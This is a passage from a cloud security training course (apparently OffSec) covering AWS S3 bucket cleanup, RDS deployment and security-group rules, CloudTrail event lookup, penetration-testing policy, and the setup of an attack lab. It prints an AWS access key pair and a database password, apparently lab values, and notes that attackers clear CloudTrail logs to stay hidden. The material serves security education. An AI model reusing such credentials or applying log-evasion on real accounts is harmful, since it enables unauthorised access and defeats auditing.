> Listing 43 - Making the Bucket Publicly Listable Using ACLs

If we try to browse the bucket again using **curl**, we'll get an XML response with the content of the bucket.

```kali-shell
kali@kali:~$ curl https://offsec-14480-20662-24324-mybucket.s3.us-east-1.amazonaws.com/
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
  <Name>offsec-14480-20662-24324-mybucket</Name>
  <Prefix/>
  <Marker/>
  <MaxKeys>1000</MaxKeys>
  <IsTruncated>false</IsTruncated>
  <Contents>
    <Key>offsec.txt</Key>
    <LastModified>2023-02-10T20:51:46.000Z</LastModified>
    <ETag>"5febbef14389ebcfc3e501fa1091adcb"</ETag>
    <Size>10</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>
</ListBucketResult>
```

> Listing 44 - Listing the Content of Publicly Readable Bucket

In most use cases, a bucket shouldn't be publicly readable/writable. It's worth pointing out that there have been data leakages due to this simple configuration.

To finish this lab, let's clean all by removing the object and the bucket we created. The **s3 rm** command removes S3 objects in a bucket and the **s3 rb** command removes an empty bucket. We will remove the object we uploaded, then remove the bucket.

```kali-shell
kali@kali:~$ aws s3 rm s3://offsec-14480-20662-24324-mybucket/offsec.txt
delete: s3://offsec-14480-20662-24324-mybucket/offsec.txt

kali@kali:~$ aws s3 rb s3://offsec-14480-20662-24324-mybucket
remove_bucket: offsec-14480-20662-24324-mybucket
```

> Listing 45 - Removing the Previously Created Object and Bucket

Through the years, there have been several data breaches involving cloud storage services. Although it's now an older, robust service, these incidents continue to occur. This doesn't mean that cloud storage is insecure, but it definitely means that proper handling of data is important when dealing with storage services.

#### Labs

1. List the available buckets in the account. You will find a single bucket.

Task 1: Ensure that the bucket is not publicly readable and objects can't be listed in the browser.

Task 2: Inside the bucket you will find a single publicly readable object. Change the configured ACL of the publicly readable object and make it private.

Answer

2. Continue with this exercise once the prior tasks have been marked as complete.

Task 1: Create a bucket with the name "offsec-lab-chall2-RANDOM-RANDOM-RANDOM".

Task 2: Move the content of all the data files (/data/data00*) from the **offsec-lab-chall1** bucket to the **offsec-lab-chall2** bucket. Just move the data files. Do not copy the .txt file.

Task 3: Delete the .txt file in the **offsec-lab-chall1** bucket.

After completing the tasks, the **offsec-lab-chall1** must be empty and the **offsec-lab-chall2** should have the 100 data files that were moved in the previous task.

Answer

## 6.3.9. Accessing the Database Services Lab

We will use an AWS account and the AWS CLI to follow along with the commands and activities of the next section. We can review the _Accessing the Lab_ section at the beginning of this Module for instructions on installing AWS CLI in a Kali virtual machine.

We will mostly use the AWS CLI to interact with our AWS infrastructure, although it is encouraged to also check the corresponding actions and results in the Management Console as an extra mile activity.

Credentials for accessing the AWS Management Console and access keys for programmatical interaction are provided when starting the lab and they will be temporarily valid for a few hours. After that, we'll need to start the lab again to retrieve new credentials.

To follow along with the content in the next section, we need to configure the AWS CLI to use the newly-retrieved credentials. We can run the **aws configure** command, entering the _Access Key ID_ and the _Secret Access Key_. We will be working in _Region_ **us-east-1** throughout this module, so let's set the _Default region name_ to that value, too. The last parameter we can leave blank; it will default to _json_.

To validate that the credentials are working correctly, we can use **aws sts get-caller-identity**, which will only return a valid response if we are using valid credentials.

```kali-shell
kali@kali:~$ aws configure
AWS Access Key ID [None]: AKIAQOMAIGYUQOXBV3HR
AWS Secret Access Key [None]: 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
Default region name [None]:us-east-1
Default output format [None]:

kali@kali:~$ aws sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYU5VFQCHOI4",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/learner"
}
```

> Listing 4 - Configuring AWS CLI and validate user.

For now, we'll simply start the lab to retrieve credentials and validate that we can interact with the AWS API via the Management Console and CLI.

## 6.3.10. Databases

Storage services like S3 are great to store files in the cloud. However, applications use databases to store, organize, and retrieve data that can be further processed into information.

AWS offers a range of database services for a variety of data types. Let's explore some of these services.

One of the main products is the [_Relational Database Service_](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Welcome.html) (RDS), which allows users to easily set up, operate, and scale a relational database in the cloud. Amazon RDS supports a variety of popular database engines including _MySQL_, _PostgreSQL_, and _MS SQL Server_, and offers built-in features such as backups, disaster recovery, and high availability. AWS also features [_Amazon Aurora_](https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/CHAP_AuroraOverview.html), which is Amazon's proprietary database engine.

Relational databases are useful for working with data in a structured way, such as the type of data we store in spreadsheets. For example, in a e-commerce application, a product can be modeled in a structured data model that has attributes like name, description, category, and price. We can store several products using the same attribute structure.

However, sometimes organizations need to work with data that doesn't have a well-defined structure. Examples of non-structured data include social media posts and sensor data. Working with a large amount of non-structured data in relational databases is not optimal. In such cases, it's better to use non-relational databases, also referred as [_NoSQL_](https://www.mongodb.com/resources/basics/databases/nosql-explained) databases. [_MongoDB_](https://www.ibm.com/topics/mongodb) is a well-known NoSQL database engine.

[_Amazon DynamoDB_](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Introduction.html) is AWS's offering of a NoSQL database service in the cloud. Similarly to RDS, it supports additional features to ensure scalability, high availability, backups, and performance.

For larger amounts of data, AWS offers [_Amazon Redshift_](https://docs.aws.amazon.com/redshift/latest/gsg/getting-started.html), a cloud-based data warehouse service optimized to analyze high amounts of data quickly and efficiently.

Additionally, AWS offers [_Amazon ElastiCache_](https://docs.aws.amazon.com/elasticache/index.html), an in-memory data store and cache service. Unlike the previously-mentioned services, ElastiCache uses non-volatile memory, like RAM, to store data, making this service ideal for caching and low-latency data storage. ElastiCache supports both _Memcached_ and _Redis_ as database engines, and offers features like automatic failover, backup and restore, scalability, and security.

Network access to databases is managed through VPC features like security groups. Using IAM users and policies, we can control identity access for interacting with the service API and even authentication.

In this lab, we will deploy an RDS instance with a default configuration and compare the result with a secure deployment. Before deploying a database instance, we need to define some attributes, which we'll review in the following paragraphs.

First, we'll need a name to identify the database instance. We can specify the name using the **--db-instance-identifier db-defaults** argument. In this example, we're naming the instance _db-defaults_.

The _instance class_ attribute determines the computation and memory capacity of the instance. Instance classes are categorized into general-purpose, memory-optimized, and burstable performance. Each category contains several instance classes to scale the instance up and down. We will create a _db.t3.micro_ burstable performance class with the **--db-instance-class db.t3.micro** argument.

We also need to choose a database engine. The choices available at time of writing include MariaDB, MySQL, Microsoft SQL Server, Oracle, and PostgreSQL. Each engine has its own supported features and instance classes. The **--engine mysql** argument is used to set MySQL as a database engine.

The **--master-username admin** and **--master-user-password xfLxnds3.qcTaz5Rtks** determines the master username and password to authenticate to the database engine once it is deployed. This is the full-privileged user, and shouldn't be used to connect with applications.

Finally, the **--allocated-storage 20** argument sets the storage size of the database to 20 gigabytes.

If the command succeeds, it will return a JSON response with details about the configuration for the DB instance. We can validate that the first parameter corresponds to the options we set when creating the instance.

```kali-shell
kali@kali:~$ aws rds create-db-instance --db-instance-identifier db-defaults --db-instance-class db.t3.micro --engine mysql --master-username admin --master-user-password xfLxnds3.qcTaz5Rtks --allocated-storage 20
{
    "DBInstance": {
        "DBInstanceIdentifier": "db-defaults",
        "DBInstanceClass": "db.t3.micro",
        "Engine": "mysql",
        "DBInstanceStatus": "creating",
        "MasterUsername": "admin",
        "AllocatedStorage": 20,
...
```

> Listing 46 - Creating AWS RDS Instance with Defaults

We can retreive the configuration for all DB instances using the **aws rds describe-db-instances** command. If we want to specify a DB instance, we can use the **--db-instance-identifier** option to filter based on the instance name. The following listing shows the output of the command, highlighting some parameters to analyze.

```kali-shell
kali@kali:~$ aws rds describe-db-instances --db-instance-identifier db-defaults
{
    "DBInstances": [
        {
            "DBInstanceIdentifier": "db-defaults",
...
            "Endpoint": {
                "Address": "db-defaults.cwiytmocmi7j.us-east-1.rds.amazonaws.com",
                "Port": 3306,
                "HostedZoneId": "Z2R2ITUGPM61AM"
            },
...
            "VpcSecurityGroups": [
                {
                    "VpcSecurityGroupId": "sg-0723e6725b8a98c2a",
                    "Status": "active"
                }
            ],
            "DBSubnetGroup": {
                "DBSubnetGroupName": "default",
                "DBSubnetGroupDescription": "default",
                "VpcId": "vpc-0f0900c5a375bf299",
                "SubnetGroupStatus": "Complete",
                "Subnets": [
                    {
                        "SubnetIdentifier": "subnet-0e7a19a15228884cf",
                        "SubnetAvailabilityZone": {
                            "Name": "us-east-1e"
                        },
                        "SubnetOutpost": {},
                        "SubnetStatus": "Active"
                    },
                    {
                        "SubnetIdentifier": "subnet-044000caac2d84f83",
                        "SubnetAvailabilityZone": {
                            "Name": "us-east-1f"
                        },
                        "SubnetOutpost": {},
                        "SubnetStatus": "Active"
                    },
                    {
                        "SubnetIdentifier": "subnet-03edc51f7da172342",
                        "SubnetAvailabilityZone": {
                            "Name": "us-east-1b"
                        },
                        "SubnetOutpost": {},
                        "SubnetStatus": "Active"
                    },
                    {
                        "SubnetIdentifier": "subnet-0120e7ce643bbeb38",
                        "SubnetAvailabilityZone": {
                            "Name": "us-east-1c"
                        },
                        "SubnetOutpost": {},
                        "SubnetStatus": "Active"
                    },
                    {
                        "SubnetIdentifier": "subnet-0dbb299361dd097ce",
                        "SubnetAvailabilityZone": {
                            "Name": "us-east-1a"
                        },
                        "SubnetOutpost": {},
                        "SubnetStatus": "Active"
                    },
                    {
                        "SubnetIdentifier": "subnet-0d798b6ec04c341f3",
                        "SubnetAvailabilityZone": {
                            "Name": "us-east-1d"
                        },
                        "SubnetOutpost": {},
                        "SubnetStatus": "Active"
                    }
                ]
            },
...            
            "MultiAZ": false,
...
            "PubliclyAccessible": true,
            "StorageType": "gp2",
            "DbInstancePort": 0,
            "StorageEncrypted": false,
...
        }
    ]
}
```

> Listing 47 - Describing db-defaults RDS Instance's Configuration Parameters

Inside the _Endpoint_ attribute, we can find the public address of the DB instance and the port where the database engine's service is listening for connections. Later, we can use the _db-defaults.cwiytmocmi7j.us-east-1.rds.amazonaws.com_ address and port 3306 to connect remotely to the DB instance.

DB instances need to be attached to a VPC subnet for network communication. We didn't specify any networking parameter, so the default VPC was used. It also selected the default security group of the default VPC.

We'll also note that there is a _DBSubnetGroup_ object with a list of subnets. We cannot directly select a subnet from a VPC, but instead we need to create an RDS object named _subnet group_. A subnet group is a collection of subnets for the instance to use when deploying. Because we didn't specify a subnet group, a default subnet group was created with all the subnets in the default VPC. The subnet group must have at least two subnets in two different AZs. The reason for this is that RDS supports _Multi-AZ_ deployments, which creates a standby instance in a different AZ. By default, the instance is deployed in _Single-AZ_, but we can convert them to Multi-AZ at any time. The _"MultiAZ": false_ parameter confirms this is a Single-AZ deployment.

The _"PubliclyAccessible": true_ parameter indicates that the database instance will have a public IP address, which means it will be accessible from the internet. However, it still needs to have permissions configured in the VPC through ACLs and security groups. The default security group only allows connection from inside the VPC. It's not common to connect to the database from the internet, so this parameter, in most cases, should be set to _false_.

It is also a good practice to encrypt the volume where the database data is stored. The _"StorageEncrypted": false_ parameter indicates that by default, it is not encrypted.

As the last step of our lab, let's connect to our newly created DB instance from our local machine.

The _PubliclyAccessible_ parameter is already set to _true_, but we still need to permit access by adding an inbound rule to the security group the DB instance is associated with. We'll add a rule that permits inbound access from our public IP only to the port where the database service is listening, which is 3306.

We'll need the security group ID, which we can get from the output of the **describe-db-instances** command we ran before: _"VpcSecurityGroupId": "sg-0723e6725b8a98c2a"_. We'll also use **curl ifconfig.me** to get our public IP address.

Now we can add the inbound rule by running the **ec2 authorize-security-group-ingress** command. With the **--group-id sg-0723e6725b8a98c2a** argument, we specify the security group ID. We want to allow TCP connection to port 3306, so we'll use the **--protocol tcp** and **--port 3306** arguments. Using **--cidr**, we'll specify our public IP address collected from the **curl** command in CIDR format, so that access is only permitted to that IP.

```kali-shell
kali@kali:~$ curl ifconfig.me
1.2.3.4

kali@kali:~$ aws ec2 authorize-security-group-ingress --group-id sg-0723e6725b8a98c2a --protocol tcp --port 3306 --cidr 1.2.3.4/32
{
    "Return": true,
    "SecurityGroupRules": [
        {
            "SecurityGroupRuleId": "sgr-0ef03edc809cbc5cd",
            "GroupId": "sg-0723e6725b8a98c2a",
            "GroupOwnerId": "123456789012",
            "IsEgress": false,
            "IpProtocol": "tcp",
            "FromPort": 3306,
            "ToPort": 3306,
            "CidrIpv4": "1.2.3.4/32"
        }
    ]
}
```

> Listing 48 - Adding a Security Group Inbound Rule to Permit Remote Access to the Database

Our database engine is MySQL, so we can connect from the CLI with a MySQL-compatible client. We'll use the **mysql** command to connect to our database. If it's not installed by default, we can run **sudo apt -y install mariadb-client** to install it. We can specify the username with the **-u admin** argument. With the **-p** argument, we specify we'll use a password to authenticate. By using the **-h db-defaults.cwiytmocmi7j.us-east-1.rds.amazonaws.com** argument, we can specify the public address of DB instance.

```kali-shell
kali@kali:~$ mysql -p -u admin -h db-defaults.cwiytmocmi7j.us-east-1.rds.amazonaws.com
Enter password:

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 19
Server version: 8.0.28 Source distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
MySQL [(none)]> exit
Bye
```

> Listing 49 - Connecting to db-defaults DB Instance from our Local Machine

We got the MySQL prompt, which means we can now interact directly with our database engine to start creating databases and tables and inserting data. For now, we'll only type **exit** to return to our system prompt.

It's worth noting that, in this lab, we access the database from the internet. Although we restricted access to our public IP address, this does not represent configuration best practices. If we create a database instance in the Management Console, however, we'll notice that the default configuration follows best practices, such enabling encryption and not making it publicly accessible.

![[OffSec/Cloud/Cloud Essentials/z. images/84dc7c53d7f00d26c739b00564ad78f6_MD5.jpg]]

Figure 14: Default Setting when Launching DB Instance in Management Console

This example shows why it's important to read the documentation for each service, and study the recommendations for best practices before we start deploying resources.

#### Labs

1. Create a RDS DB instance that fulfills the following requirements:

- Region: us-east-1
- Instance Identifier: offsec-chall-db-instance1
- Instance class: db.t3.micro
- DB Engine: MariaDB
- DB port: 13306
- Master username: admin (Set a strong password)
- Storage Encrypted: false
- Publicly Accessible: false

You will need to wait 3 to 5 minutes for the instance to be ready. Do not proceed with exercise 2 without completing this exercise.

Answer

2. After completing exercise 1, create a RDS DB instance that fulfills the following requirements:

- Region: us-east-1
- Instance Identifier: offsec-chall-db-instance2
- Instance class: db.t3.micro
- DB Engine: MySQL
- DB port: Default
- Master username: admin (Set a strong password)
- Storage Encrypted: false
- Publicly Accessible: true

You will need to wait 3 to 5 minutes for the instance to be ready. Do not proceed with exercise 3 without completing this exercise.

Answer

3. After completing exercise 2, add an inbound rule to the security group that the DB-instance created in exercise 2 is associated with. The inbound rule should permit access to the DB port from a specific public IP address (not 0.0.0.0/0).

Answer

## 6.3.11. Accessing the Logging and Monitoring Lab

We will use an AWS account and the AWS CLI to follow along with the commands and activities of the next section. We can review the _Accessing the Lab_ section at the beginning of this Module for instructions on installing the AWS CLI in a Kali virtual machine.

We will mostly use the AWS CLI to interact with our AWS infrastructure, although it is encouraged to also check the corresponding actions and results in the Management Console as an extra mile activity.

Credentials for accessing the AWS Management Console and access keys for programmatical interaction are provided when starting the lab and they will be temporarily valid for a few hours. After that, we'll need to start the lab again to retrieve new credentials.

To follow along with the content in the next section we need to configure the AWS CLI to use the newly-retrieved credentials. We can run the **aws configure** command, entering the _Access Key ID_ and the _Secret Access Key_. We will be working in _Region_ **us-east-1** throughout this module, so let's set the _Default region name_ to that value, too. We can leave the last parameter blank, as it will default to _json_.

To validate that the credentials are working correctly, we can use the **aws sts get-caller-identity** command, which will only return a valid response if we are using valid credentials.

```kali-shell
kali@kali:~$ aws configure
AWS Access Key ID [None]: AKIAQOMAIGYUQOXBV3HR
AWS Secret Access Key [None]: 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
Default region name [None]:us-east-1
Default output format [None]:

kali@kali:~$ aws sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYU5VFQCHOI4",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/learner"
}
```

> Listing 4 - Configuring AWS CLI and validate user.

For now, let's simply start the lab to retrieve credentials and validate that we can interact with the AWS API via the Management Console and CLI.

## 6.3.12. Logging and Monitoring

_Logging_ is an important aspect to consider when deploying resources in cloud infrastructure. It provides visibility into who or what took which action over what resources at what moment.

[_Amazon CloudTrail_](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-user-guide.html) is a service that records and logs both API and non-API activities of an AWS account made through the AWS Management Console, AWS SDKs, AWS CLI, and other AWS services. CloudTrail service is enabled by default when we create an AWS account.

Activities are recorded in _CloudTrail events_ represented using a JSON log format. CloudTrail can log three types of events: _management events_, _data events_, and _CloudTrail Insights_.

Management events, also known as _control plane operations_, provide information about management operations that are performed on AWS resources, such as creating, modifying, and deleting EC2 instances, S3 buckets, RDS instances, IAM policies, etc.

Data events, also known as "data plane operations", provide information about data-level operations inside AWS resources. Examples include S3 object-level activities such as uploading, downloading, and deleting objects. Not all services support logging of data-level operations. For example, DynamoDB supports logging of item-level activity such us _PutItem_, _DeleteItem_, and _UpdateItem_ in database tables, but RDS doesn't support logging of activities at that level, so it's necessary to interact with the database engine to obtain that information.

Insight events are generated by the CloudTrail Insights feature, which uses machine learning to identify anomalous activity in an AWS account. The concept of anomalous activity is relative to the AWS account. For example, let's assume our account typically logs no more than 5 amazon S3 _deleteBucket_ API calls per minute, but then suddenly starts to log an average of 50 API calls per minute. That event is considered anomalous by CloudTrail Insight in our Account. However, that same event is not an abnormal activity in another AWS account.

By default, CloudTrail only logs management events for 90 days free of charge, but not data or Insights events.

To record data or Insight events, we need to create a _trail_, a configuration that specifies which events to log and where the logs will be stored. We can also create trails to log specific management events and store them for more than the 90-day default retention period. Additional charges apply for logging events in trails, depending on the type of event, quantity, and retention period.

Trails also integrate with other AWS services that need events to provide services like monitoring, notifications and alarm settings, identification of malicious activities, configuration management, etc. For example, [_CloudWatch_](https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/WhatIsCloudWatch.html) is an AWS service that can generate alerts over specific trail events. To store events for longer periods, we can create trails and choose to store them in an S3 bucket.

In the AWS Management Console, we can navigate to the CloudTrail service and check _Event History_ to find all the management events logged for the past 90 days.

![[OffSec/Cloud/Cloud Essentials/z. images/bc93109fc243529cd9603be6475b99a3_MD5.jpg]]

Figure 15: CloudTrail Event History in the Management Console

Interacting with CloudTrail to search for events in the Management Console is generally more convenient than using the AWS CLI. However, there might be scenarios where we don't have access to the Management Console, so we'll learn how to interact and filter for events in CloudTrail using the AWS CLI.

Before we start interacting with CloudTrail, let's create an IAM user to generate a management event that then we can easily identify.

```kali-shell
kali@kali:~$ aws iam create-user --user-name newuser
{
    "User": {
        "Path": "/",
        "UserName": "newuser",
        "UserId": "AIDAQOMAIGYUT4JBPL3GI",
        "Arn": "arn:aws:iam::123456789012:user/newuser",
    }
}
```

> Listing 50 - Creating an IAM User

Using AWS CLI, we can run the **aws cloudtrail lookup-events** command to retrieve the event history. Depending on the activity inside the account, querying the event history without limiting the results can take significant time to complete. The **--max-results 5** argument limits the output for the last 5 events. We'll probably need to wait a few seconds for the _CreateUser_ event to appear.

```kali-shell
kali@kali:~$ aws cloudtrail lookup-events --max-results 5
{
    {
    "Events": [
        {
            "EventId": "0ee9a80d-3dea-4c69-86d4-a0cd1a16a31b",
            "EventName": "CreateUser",
            "ReadOnly": "false",
            "AccessKeyId": "ASIAQOMAIGYUZWHNJ3WI",
            "EventTime": "2023-02-14T12:54:19-05:00",
            "EventSource": "iam.amazonaws.com",
            "Username": "labadmin@offensive-security.com",
            "Resources": [
                {
                    "ResourceType": "AWS::IAM::User",
                    "ResourceName": "arn:aws:iam::123456789012:user/newuser"
                },
                {
                    "ResourceType": "AWS::IAM::User",
                    "ResourceName": "newuser"
                },
                {
                    "ResourceType": "AWS::IAM::User",
                    "ResourceName": "AIDAQOMAIGYUT4JBPL3GI"
                }
            ],
            "CloudTrailEvent": "{\"eventVersion\":\"1.08\",\"userIdentity\":{\"type\":\"AssumedRole\",\"principalId\":\"AROAQOMAIGYU5VFQCHOI4:labadmin@offensive-security.com\",\"arn\":\"arn:aws:sts::123456789012:assumed-role/AWSReservedSSO_AWSAdministratorAccess_e22ff2082c359124/labadmin@offensive-security.com\",\"accountId\":\"123456789012\",\"accessKeyId\":\"ASIAQOMAIGYUZWHNJ3WI\",\"sessionContext\":{\"sessionIssuer\":{\"type\":\"Role\",\"principalId\":\"AROAQOMAIGYU5VFQCHOI4\",\"arn\":\"arn:aws:iam::123456789012:role/aws-reserved/sso.amazonaws.com/AWSReservedSSO_AWSAdministratorAccess_e22ff2082c359124\",\"accountId\":\"123456789012\",\"userName\":\"AWSReservedSSO_AWSAdministratorAccess_e22ff2082c359124\"},\"webIdFederationData\":{},\"attributes\":{\"creationDate\":\"2023-02-14T16:21:53Z\",\"mfaAuthenticated\":\"false\"}}},\"eventTime\":\"2023-02-14T17:54:19Z\",\"eventSource\":\"iam.amazonaws.com\",\"eventName\":\"CreateUser\",\"awsRegion\":\"us-east-1\",\"sourceIPAddress\":\"1.2.3.4\",\"userAgent\":\"aws-cli/2.8.11 Python/3.9.11 Linux/5.10.16.3-microsoft-standard-WSL2 exe/x86_64.kali.2022 prompt/off command/iam.create-user\",\"requestParameters\":{\"userName\":\"newuser\"},\"responseElements\":{\"user\":{\"path\":\"/\",\"userName\":\"newuser\",\"userId\":\"AIDAQOMAIGYUT4JBPL3GI\",\"arn\":\"arn:aws:iam::123456789012:user/newuser\",\"createDate\":\"Feb 14, 2023 5:54:19 PM\"}},\"requestID\":\"7292c6d5-00c7-40bb-9edf-df364386fd9b\",\"eventID\":\"0ee9a80d-3dea-4c69-86d4-a0cd1a16a31b\",\"readOnly\":false,\"eventType\":\"AwsApiCall\",\"managementEvent\":true,\"recipientAccountId\":\"123456789012\",\"eventCategory\":\"Management\",\"tlsDetails\":{\"tlsVersion\":\"TLSv1.2\",\"cipherSuite\":\"ECDHE-RSA-AES128-GCM-SHA256\",\"clientProvidedHostHeader\":\"iam.amazonaws.com\"}}"
        }
    ],
    "NextToken": "Q+pk2IuS0x2a4cprhwieM+3T4REs98SPq61+fetZ89J4fMrJD60ySn++qWNkXanZ"
}
...
```

> Listing 51 - Listing CloudTrail Events History with AWS CLI

We can find some useful information about the event, such as the event name "CreateUser", access keys, the username that generated the event, and the resources associated with the event.

We received a response from the CloudTrail service. The actual event is represented in the JSON object in the _CloudTrailEvent_ attribute. Let's collect additional information about this event.

We can use the **--query Events[*].CloudTrailEvent** argument to retrieve only that attribute value. We'll use **--output text** to get the string value of that attribute, which happens to be a JSON object that we can then pipe into **jq**, a JSON reader for the command line. If **jq** is not recognized as a command, we can install it with **sudo apt -y install jq**.

We'll also use the **--lookup-attributes "AttributeKey=EventName,AttributeValue=CreateUser"** to collect only the information relating to _CreateUser_ events.

```kali-shell
kali@kali:~$ aws cloudtrail lookup-events --lookup-attributes "AttributeKey=EventName,AttributeValue=CreateUser" --query Events[*].CloudTrailEvent --output text | jq
{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROAQOMAIGYU5VFQCHOI4:labadmin",
    "arn": "arn:aws:sts::123456789012:assumed-role/AWSReservedSSO_AWSAdministratorAccess_e22ff2082c359124/labadmin",
    "accountId": "123456789012",
    "accessKeyId": "ASIAQOMAIGYUZWHNJ3WI",
    "sessionContext": {
      "sessionIssuer": {
        "type": "Role",
        "principalId": "AROAQOMAIGYU5VFQCHOI4",
        "arn": "arn:aws:iam::123456789012:role/aws-reserved/sso.amazonaws.com/AWSReservedSSO_AWSAdministratorAccess_e22ff2082c359124",
        "accountId": "123456789012",
        "userName": "AWSReservedSSO_AWSAdministratorAccess_e22ff2082c359124"
      },
      "webIdFederationData": {},
      "attributes": {
        "creationDate": "2023-02-14T16:21:53Z",
        "mfaAuthenticated": "false"
      }
    }
  },
  "eventTime": "2023-02-14T17:54:19Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateUser",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "1.2.3.4",
  "userAgent": "aws-cli/2.8.11 Python/3.9.11 Linux/5.10.16.3-microsoft-standard-WSL2 exe/x86_64.kali.2022 prompt/off command/iam.create-user",
  "requestParameters": {
    "userName": "newuser"
  },
  "responseElements": {
    "user": {
      "path": "/",
      "userName": "newuser",
      "userId": "AIDAQOMAIGYUT4JBPL3GI",
      "arn": "arn:aws:iam::123456789012:user/newuser",
      "createDate": "Feb 14, 2023 5:54:19 PM"
    }
  },
  "requestID": "7292c6d5-00c7-40bb-9edf-df364386fd9b",
  "eventID": "0ee9a80d-3dea-4c69-86d4-a0cd1a16a31b",
  "readOnly": false,
  "eventType": "AwsApiCall",
  "managementEvent": true,
  "recipientAccountId": "123456789012",
  "eventCategory": "Management",
  "tlsDetails": {
    "tlsVersion": "TLSv1.2",
    "cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
    "clientProvidedHostHeader": "iam.amazonaws.com"
  }
}
```

> Listing 52 - Getting the JSON Object Details of the CreateUser Event

Using the **--lookup-attributes** argument, we can filter events based on other attributes such as, _EventName_, _Username_, _ResourceType_, _ResourceName_, _EventSource_, or _AccessKeyId_.

Event logging provides helpful insight for AWS account owners, but may also provide useful information for malicious users if they get access to these records. Some recommendations to follow when configuring CloudTrail include limiting access to this service through IAM policies, separating trails for different use cases, and making sure that S3 buckets where trails are stored are private and encrypted.

Attackers will try to abuse CloudTrail for stealthy purposes. Specifically, they will attempt to interact with the AWS API without logging any suspicious events. They can do this by interacting directly with the CloudTrail service, assuming they have compromised an identity with the necessary permissions, and clear the event history or disable logging. They can also interact with other services, for example, deleting the logs directly from S3 buckets.

#### Labs

1. Which of the following events will be recorded in CloudTrail by default for 90 days? (Answer only with the lowercase letter of the option, e.g. a)

```
a. Details of a function executed in Lambda.
b. The deletion of a file inside an EC2 instance.
c. The creation of a Trail in CloudTrail Service.
d. An abnormal quantity of AccessDeniedException in a 
five-day period on the IAM API call AttachUserPolicy
```

Answer

2. We received a report of a potential compromise in the account. But no resources seem to be created or modified. Analyze the last events in the AWS account inside the us-east-1 region to find any abnormal activity from any IAM user.

Answer

## 6.4. Security and Best Practices

AWS, as one of the biggest cloud providers, has to ensure the security of its services, but like any other technology, it requires careful planning and management to ensure that customers use services in a secure manner.

Overall, AWS offers a range of security features and tools to help customers protect their applications and data. By implementing these features and following best practices, organizations can ensure that their AWS infrastructure is secure and compliant with industry standards.

This Learning Unit covers the following Learning Objectives:

- Perform penetration testing in AWS
- Understand AWS audit tools
- Learn how to perform an attack against AWS Cloud

## 6.4.1. Penetration Testing in AWS

As security professionals, we may want to carry out security assessments and penetration testing in customers' AWS cloud infrastructure. AWS provides a pre-defined policy for penetration testing activities that grants implicit approval to test customers' resources inside their AWS accounts.

The [_AWS Customer Support Policy for Penetration Testing_](https://aws.amazon.com/security/penetration-testing/) outlines the rules and guidelines for penetration testing in AWS infrastructure. According to the policy, customers are allowed to conduct penetration tests on their own AWS resources.

The policy also specifies a list of services that don't need prior approval as long as the targets for testing are customers' resources and applications, but not the AWS infrastructure itself. The list includes most of the computing services like Elastic Cloud Computing, [_Lightsail_](https://lightsail.aws.amazon.com/ls/docs/en_us/articles/what-is-amazon-lightsail), Lambda, Elastic Beanstalk, Elastic Container Service, and Fargate. Other permitted services are Relational Database Service, CloudFront, VPC Gateways, WAF, [_Elastic Load Balancers_](https://docs.aws.amazon.com/elasticloadbalancing/latest/userguide/what-is-load-balancing.html), and S3-hosted applications.

Finally, the policy defines a list of forbidden activities and simulated events that require a request for authorization. Some of these activities are Red/Blue/Purple team testing, which requires hosting _Command and Control_ (C2) platforms, Network Stress, DDoS Simulation testing, and simulated _Phishing_ campaigns.

These guidelines change from time to time, so it is encouraged to always check the policy when setting up the scope for any security assessments in AWS.

## 6.4.2. AWS Audit tools

With AWS's wide catalog of services, it can be challenging to keep track of all the different services and configurations that are in place within the cloud infrastructure. AWS provides some services to help to identify any potential issues or areas of risk and provide recommendations for improvement.

[_AWS Security Hub_](https://docs.aws.amazon.com/securityhub/latest/userguide/index.html) can run automated security checks based on best practices and it can also consume data from other AWS security-related services to consolidate, correlate, and prioritize findings in one place.

[_AWS Trusted Advisor_](https://docs.aws.amazon.com/awssupport/latest/user/trusted-advisor.html) provides recommendations to follow best practices to help optimize the security and performance of the account. [_AWS Well Architected Framework_](https://docs.aws.amazon.com/wellarchitected/latest/userguide/index.html) also provides recommendations from a design principles and architectural best practices point of view.

[_AWS Config_](https://docs.aws.amazon.com/config/latest/developerguide/index.html) is a configuration management tool that provides a detailed view of our resources in AWS, including how they are configured, how they are related to one another, and how they have changed over time, then determines compliance based on the rules we provide.

Additionally, there are several third-party, proprietary, and open-source tools that, given AWS credentials, can run independent checks through the AWS API to highlight potential risks in configurations.

It is important to be aware that these tools themselves could potentially be abused by attackers, who may use them to identify weaknesses that could lead to attack vectors. Therefore, it is important to manage permissions accordingly, as with other AWS services.

## 6.4.3. Accessing the "Example Attack Against AWS" Lab

So far, we've been interacting with the AWS API to create and destroy resources. In this section, we'll interact with existing resources we have pre-created in an AWS lab.

When starting the lab, we will get a public IP address belonging to the DNS server that we'll need to access the lab domain.

In our Kali machine, we can check our current DNS server by reading the **/etc/resolv.conf** file.

```kali-shell
kali@kali:~$ cat /etc/resolv.conf
# Generated by NetworkManager
nameserver 1.1.1.1
```

> Listing 53 - Getting DNS Servers in Kali

We need to add a new _nameserver_ line at the beginning so that our DNS queries first go to our lab DNS server. In the following example, we'll use **nano** to modify the file, but we can choose any text editor that we feel comfortable working with. We'll also run **nano** with **sudo** because we need _root_ privileges to edit that file. We should also add the IP address we got when starting the lab. After editing the file, it should appear as follows:

```kali-shell
kali@kali:~$ sudo nano /etc/resolv.conf
[sudo] password for kali:

kali@kali:~$ cat /etc/resolv.conf
# Generated by NetworkManager
nameserver 44.205.254.229
nameserver 1.1.1.1
```

